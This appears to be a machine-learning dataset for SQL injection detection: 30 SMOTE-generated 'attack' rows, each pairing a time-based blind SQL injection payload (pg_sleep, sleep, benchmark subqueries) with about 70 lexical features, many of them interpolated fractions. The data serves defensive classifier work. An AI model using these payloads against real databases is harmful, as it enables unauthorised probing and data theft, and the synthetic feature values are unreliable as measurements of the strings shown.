id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001821,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,0.44886709530380225,82.81086016741862,26.562172033483726,3.6769573899844015,23.452715041854656,17.12434406696745,32.343258050225586,9.890543008370932,0.2834425582877102,0.2054251154169589,0.3912069771483005,0.11992534914703039,0.0,1.0,2.0,0.0,0.0,1.8905430083709311,0.0,4.0,0.0,1.0,0.0,3.890543008370931,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8905430083709314,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.890543008370931
SMOTE_001822,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,1.7047566410985153,97.09828559275837,24.316952401206937,3.0688033093302773,33.169524012069374,1.6830475987930633,48.87961878430981,13.366095197586125,0.3433077342687213,0.017207031725317304,0.5019955602509479,0.13748967375501348,1.6339048024138751,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,10.049142796379188,0.0,0.0,0.0,1.0000000000000002,1.0,0.0,0.0,0.6830475987930624,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.31695240120693763,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.316952401206938
SMOTE_001823,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000003,0.07496312226812378,65.98081187843346,23.98081187843345,3.5526004392301282,19.0,10.0,27.0,9.98081187843345,0.28796377023537634,0.1515598790712507,0.4092116734923769,0.1512646772009961,0.9808118784334499,0.019188121566550143,2.0,0.0,0.0,1.0,0.0,4.0,0.9808118784334499,1.0,0.0,3.0,0.9808118784334496,0.019188121566550254,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001824,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,0.32840452464926617,79.3102016384943,21.31020163849431,3.0632415361977574,28.155100819247153,2.0,39.0,10.155100819247155,0.3549744271530707,0.0252218387559877,0.4918258557417603,0.12797787834918137,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.0,0.07755040962357718,0.0,0.0,1.0000000000000002,0.0,1.0,0.0,0.07755040962357716,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.9224495903764228,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.922449590376423
SMOTE_001825,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,1.3631179293732867,67.72313744010562,21.6945098171504,3.385432309801973,15.0,15.55607853720321,28.472549085752004,8.6945098171504,0.2236956270111149,0.2262981754685656,0.4210558934317471,0.1289503040885724,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.6945098171504007,0.0,4.0,0.0,0.0,1.0,3.6945098171504007,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6945098171504009,0.0,0.30549018284959906,0.6945098171504009,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.694509817150401
SMOTE_001826,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,0.3425238176135948,92.05060284966423,24.728743671332637,3.415303502617408,39.18623101399791,1.0678140821668407,39.93218591783316,11.864371835666319,0.42497555060776326,0.01174031669958514,0.4344180177449183,0.12886611494773334,2.796557753499478,0.06781408216684082,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.9321859178331591,0.06781408216684087,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001827,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,2.2542716230943514,72.0,23.25054383515234,3.470654801139896,15.0,18.937907876364257,29.374728082423832,8.687364041211916,0.20833333333333334,0.26302649828283686,0.4079823344781088,0.12065783390572105,0.3126359587880845,-1.1102230246251565e-16,1.3747280824238313,0.0,0.0,1.6873640412119157,0.0,4.312635958788084,0.0,0.0,1.0,3.062092123635747,0.3126359587880845,0.0,0.6873640412119156,0.0,0.0,1.0,1.0,0.0,0.0,0.31263595878808437,0.0,0.0,0.0,0.6873640412119157,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6873640412119156,0.31263595878808437,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6873640412119157
SMOTE_001828,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,1.0572774298225323,96.34819257741191,22.48885556694107,2.9117810984846924,29.95542226776428,1.837048144352977,50.8816258765887,13.674096288705954,0.31170896439481227,0.019010895116662777,0.5274430222177444,0.14183711827078047,0.4888555669410699,0.8370481443529767,0.0,0.0,1.0,0.0,0.0,10.51114443305893,0.0,0.0,0.0,1.0000000000000002,0.16295185564702327,0.8370481443529767,0.0,0.8370481443529767,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001829,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,1.5514371964684748,69.20911743296257,22.214683274387497,3.454952507588576,16.28809964632497,16.28253380490004,28.28253380490004,8.355950176837515,0.24002034205295653,0.2327161770620237,0.40726669278811817,0.1199967880969016,0.21468327438749513,-1.1102230246251565e-16,1.5706334512250097,0.0,0.0,1.785316725612505,0.0,3.785316725612505,0.0,0.0,0.785316725612505,3.355950176837515,0.21468327438749504,0.0,0.7853167256125049,0.21468327438749504,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.785316725612505,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.785316725612505
SMOTE_001830,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,2.181646166403885,64.84504297608336,21.488931641148813,3.3698506782258892,15.0,13.911453129190495,27.44465820574406,8.488931641148811,0.23403360999970058,0.2103481445718906,0.4240096028570573,0.13160864257135158,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.4889316411488118,0.0,4.0,0.0,0.0,1.0,3.4889316411488114,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4889316411488118,0.0,0.5110683588511882,0.48893164114881177,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.488931641148812
SMOTE_001831,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,2.543816952269778,83.54324905648976,23.30864981129795,3.2711728675334797,18.271624528244875,15.382700377404099,38.580274339542825,11.30864981129795,0.2153924692499008,0.19101478725978044,0.4589919207690649,0.1346008227212538,0.0,1.3086498112979503,1.3456750943510247,0.0,0.0,1.6728375471755124,0.0,5.981487358473463,0.0,0.0,1.0,3.0185126415265375,0.0,0.3271624528244876,0.6728375471755124,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6728375471755126,0.0,0.3271624528244875,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001832,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,1.9382583672789389,87.24533470258031,26.40671625223412,3.5583011033243297,25.61846969364383,14.813432504468242,35.81343250446824,11.0,0.2907803950703774,0.16661402138422565,0.4133584840524943,0.12924709949290264,0.0,1.0,2.0,0.0,0.0,1.6016790630585303,0.0,5.0,0.39832093694146986,1.0,0.0,3.60167906305853,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6016790630585301,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6016790630585303
SMOTE_001833,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,4.3172819277617975,60.80128856496892,23.334407137474102,3.5822673197716095,18.735051419958562,10.0,23.13247429002072,8.933762854989642,0.30566100589522166,0.16486721830557943,0.3829879565455222,0.14648381925367668,1.400644282484461,-1.1102230246251565e-16,1.0662371450103592,0.0,0.0,1.0,0.0,3.5331185725051797,0.0,0.0,0.5331185725051795,3.0,0.4668814274948205,0.0,0.5331185725051796,0.4668814274948204,0.0,1.0,1.0,0.0,0.0,0.0,0.4668814274948204,0.4668814274948204,0.0,0.4668814274948204,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.933762854989641
SMOTE_001834,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,1.200857793651843,57.76676612126487,21.699701636205376,3.404985240022662,15.699701636205376,10.0,24.300298363794624,7.766766121264875,0.27195438689683565,0.1731192797299913,0.42052273202312956,0.13440360135004348,0.0,0.2332338787351252,2.0,0.0,0.0,1.0,0.0,3.7667661212648746,0.0,0.0,0.7667661212648748,3.0,0.0,0.23323387873512522,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2332338787351253,0.0,0.7667661212648748,0.23323387873512524,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2332338787351254
SMOTE_001835,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,0.8231565646475656,80.98543791029908,26.197087582059815,3.6581462155068403,22.99635947757477,16.394175164119634,31.795631373089726,9.799271895514954,0.2843511395016611,0.2001388247176082,0.39368492591362114,0.12182510986710955,0.0,1.0,2.0,0.0,0.0,1.7992718955149543,0.0,4.0,0.0,1.0,0.0,3.7992718955149543,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7992718955149543,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7992718955149543
SMOTE_001836,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,2.1432153240542493,84.94049936553192,22.697285533009122,3.215582000152741,33.091856599027366,1.5756786167477195,39.42432138325228,10.848642766504561,0.3865418114996962,0.01913673771498653,0.4666995935784926,0.1276218572068247,1.2729641497568407,0.5756786167477197,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.42432138325228036,0.5756786167477196,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001837,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,2.0584105655214398,94.26900210625499,24.048248420308767,3.2410237048361705,36.192993681235066,1.317250526563745,44.12425684532868,12.63450105312749,0.3852331590848755,0.013882640157873105,0.4669987587147066,0.1338854420425448,2.0482484203087656,0.3172505265637447,0.0,0.0,1.0,0.0,0.0,8.951751579691233,0.0,0.0,0.0,1.0000000000000002,0.6827494734362552,0.3172505265637447,0.0,0.31725052656374475,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001838,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000003,0.9375194006706669,67.39848875344508,24.0,3.522165207087868,19.0,10.0,28.118791002756062,10.279697750689015,0.28220843228436693,0.14853075383387734,0.4167906551085965,0.15247015877315925,0.7203022493109842,0.27969775068901576,2.0,0.0,0.0,1.0,0.0,4.2796977506890155,1.0,1.0,0.0,3.0,0.7203022493109842,0.2796977506890158,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001839,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,0.5199139376421158,69.8165685408485,23.80276142347475,3.451180696991616,19.0,10.0,30.211045693898996,10.605522846949498,0.272477832659562,0.1434093856102958,0.43243133683651686,0.15168144489362534,0.0,1.0,2.0,0.0,0.0,1.0,0.0,4.802761423474749,0.8027614234747491,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001840,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,0.23100708767909767,86.68058711979728,27.1292759322921,3.6913166656444654,24.77565559375259,18.0,33.77565559375259,10.129275932292098,0.2854257664578434,0.20813318509527598,0.3894923590054814,0.11694868944139923,0.0,1.0,2.0,0.0,0.0,2.0,0.0,4.129275932292098,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001841,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000031,0.6482939817911884,62.28469764522627,16.66429450552795,2.9144741499462876,21.715302354773737,1.8540929356787927,29.715302354773737,9.0,0.34890456521116475,0.029198278999220575,0.4773716666598471,0.14452548912976765,0.0,2.810201569849157,0.18979843015084286,0.0,0.0,1.0,0.0,4.905100784924579,0.0,0.09489921507542143,0.0,1.1897984301508429,0.0,1.0,0.09489921507542143,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.09489921507542137,0.9051007849245786,0.09489921507542143,0.0,0.0,0.0,0.0,0.0,0.0,0.9051007849245787,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001842,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,0.5868453247497528,94.58706778269851,21.865948210149917,2.8407587788206046,28.0,2.0,51.123274942098845,13.46379284059967,0.2974764585781602,0.021248318469868605,0.5393244260603636,0.14195079689160756,0.0,1.0,0.0,0.0,1.0,0.0,0.0,10.597844630449753,0.0,0.0,0.0,1.0000000000000002,0.0,1.0,0.0,0.8659482101499174,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001843,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.8648525083552789,98.53977298864102,23.539772988641023,2.875605586515696,29.539772988641023,2.0,53.0,14.0,0.2997234547762398,0.020297870876051033,0.537893578215352,0.14208509613235715,0.7698864943205113,0.23011350567948868,0.0,0.0,1.0,0.0,0.0,11.0,0.0,0.0,0.0,1.0000000000000002,0.7698864943205113,0.23011350567948868,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.23011350567948874,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.230113505679489
SMOTE_001844,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000026,0.5849021000686837,86.87596268634054,26.920367028514498,3.7231800934949772,34.20367028514496,10.0,32.35376051525357,10.318531885942015,0.39509193844408386,0.11522900660951745,0.37116621446119036,0.11851284048520834,0.0,4.0,0.0,0.0,0.0,1.0,0.0,4.318531885942016,0.0,0.920367028514496,0.07963297148550405,1.0000000000000002,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.920367028514496,0.0,0.0,0.920367028514496,1.9203670285144963,0.07963297148550391,0.0,0.0,0.0,0.0,0.0,0.0,0.07963297148550397,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9203670285144963
SMOTE_001845,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,0.4797896556441536,74.75718913616053,22.0,3.345804053835211,15.0,18.0,32.205751308928434,9.551437827232109,0.20087340601688164,0.241048087220258,0.43039293292893777,0.1276855738339226,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,4.551437827232108,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001846,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000006,2.3566251643206906,86.9967948825181,25.0,3.3183459897317764,33.9967948825181,1.6003205117481905,39.39967948825181,12.0,0.38888847373668345,0.018763183405889824,0.45398346898648717,0.1383648738709396,1.1990384647554304,0.6003205117481899,0.0,0.0,1.0,0.0,0.0,8.0,0.6003205117481898,0.0,0.0,1.0000000000000002,0.39967948825181004,0.6003205117481899,0.0,0.6003205117481899,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.3996794882518101,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.39967948825181
SMOTE_001847,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000029,0.5562297867984479,72.0,25.530209227554174,3.5895014070375444,15.313193848297217,20.686806151702783,28.0,8.0,0.2126832478930169,0.2873167521069831,0.3888888888888889,0.1111111111111111,0.8434030758513918,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0000000000000002,0.8434030758513917,0.0,0.0,0.15659692414860815,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001848,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000006,2.042425114603209,80.35885957339,22.736165348620005,3.129115990467614,28.868082674310003,2.0,38.62269422477,10.868082674310001,0.35911304292422797,0.024933779463097647,0.4812441498563253,0.1347090277563491,0.0,0.6226942247700006,0.0,0.0,1.0,0.0,0.0,8.0,0.6226942247700005,0.0,0.0,1.0000000000000002,0.0,0.6226942247700005,0.0,0.6226942247700006,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.3773057752299993,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.377305775229999
SMOTE_001849,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000004,3.3507711854199362,65.02770702469094,22.53633022886993,3.5244196037070847,18.21798137321957,13.709358169040575,25.709358169040577,7.3910093133902155,0.2874950690916772,0.2068208714045397,0.3931832809393111,0.11250077856447202,0.5363302288699281,-1.1102230246251565e-16,0.9273395422601439,0.0,0.0,1.4636697711300721,0.0,3.463669771130072,0.0,0.0,0.463669771130072,2.391009313390216,0.5363302288699281,0.0,0.46366977113007196,0.536330228869928,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.463669771130072,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.463669771130072
SMOTE_001850,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,1.311698789278565,84.23312433762896,27.450773746440852,3.6257994570399426,24.450773746440852,15.803094985763416,34.528481858983845,9.450773746440854,0.29303406259886516,0.18487637852518296,0.40965181430213754,0.11243774457381436,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.725386873220427,0.0,4.725386873220427,0.0,1.0,0.0,3.725386873220427,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.725386873220427,1.0,0.7253868732204269,0.27461312677957306,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.725386873220427
